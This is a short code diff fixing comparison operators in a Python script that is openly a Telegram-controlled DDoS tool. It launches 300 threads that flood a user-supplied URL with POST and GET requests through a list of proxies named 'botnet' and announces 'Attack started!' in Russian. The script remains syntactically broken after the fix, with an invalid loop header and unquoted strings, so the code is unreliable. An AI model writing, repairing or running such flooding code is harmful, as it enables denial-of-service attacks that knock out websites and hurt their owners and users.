@@ -7,7 +7,7 @@ def ddos():
     global url
     global on_off
     while True:
-        if on_off = 1:
+        if on_off == 1:
             for botnet as proxy:
                 load_ddos = requests.post(f"{url}:443", proxies={"https": botnet}, timeout=0.3)
                 load_ddos = requests.get(f"{url}:443", proxies={"https": botnet}, timeout=0.3)
@@ -36,7 +36,7 @@ def start_attack(message):
     bot.send_message(message.chat.id, 'Атака начата!')
     on_off = 1
     url = message.text[14:len(message.text)]
-    if url[0:8] = https:// or url[0:7] = http://:
+    if url[0:8] == https:// or url[0:7] == http://:
         potok = 300
         for i in range(potok):
             start_ddos = threading.Thread(target=ddos)
